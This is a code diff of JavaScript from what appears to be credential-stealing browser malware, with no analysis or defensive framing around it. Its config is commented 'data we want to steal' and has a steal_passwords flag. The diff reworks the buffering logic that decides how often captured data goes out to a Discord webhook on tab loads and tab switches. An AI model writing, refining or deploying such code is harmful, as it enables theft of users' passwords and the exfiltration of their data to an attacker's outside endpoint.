@@ -28,8 +28,7 @@ let malware_url_mapping = {
 const config = {
     allow_send_on_tab_switch: false, // turn on if you want to count tab switches towards your buff count.
     allow_send_on_tab_load: true, // turn on if you want to count tab loads towards your buff count
-    buffered_sending: true, // turn on if you want to send data only on x page loads
-    buffer_send_threshold: 5, // num complete page loads required for sending data
+    buffer_send_threshold: 1, // num complete page loads required for sending data (1 = no buffer)
 
     // data we want to steal
     steal_passwords: true,  // turn on if you want to steal passwords from sites.
@@ -75,17 +74,18 @@ function send_discord_webhook(msg) {
  * @param {ENUM} dispatcher 
  */
 function dispatch_info_send(dispatcher, msg) {
-    let valid_dispatch = (dispatcher == TAB_SWITCH && config.allow_send_on_tab_switch) || (dispatcher == TAB_LOAD && config.allow_send_on_tab_load);
-    if (valid_dispatch) {
+    const valid_dispatch = (dispatcher == TAB_SWITCH && config.allow_send_on_tab_switch) || (dispatcher == TAB_LOAD && config.allow_send_on_tab_load);
+    if (valid_dispatch && config.buffer_send_threshold > 1) {
         buffer_count++;
-        console.log(buffer_count);
+        console.log(`[i] Current buffer count: ${buffer_count}`);
     }
 
-    if (valid_dispatch && !config.buffered_sending) {
-        // we've valid that the dispatcher is allowed to dispatch.
-        send_webhook(msg);
-    } else if ((valid_dispatch && config.buffered_sending) && (buffer_count % config.buffer_send_threshold == 0)) {
-        send_webhook(msg);
+    // TODO: Add mapping for sending other webhooks
+
+    // validate that dispatcher is allowed to execute
+    if (valid_dispatch && (buffer_count % config.buffer_send_threshold == 0)) {
+        console.log("[+] Buffer ready. Sending webhook...")
+        send_discord_webhook(msg);
     }
 }
 
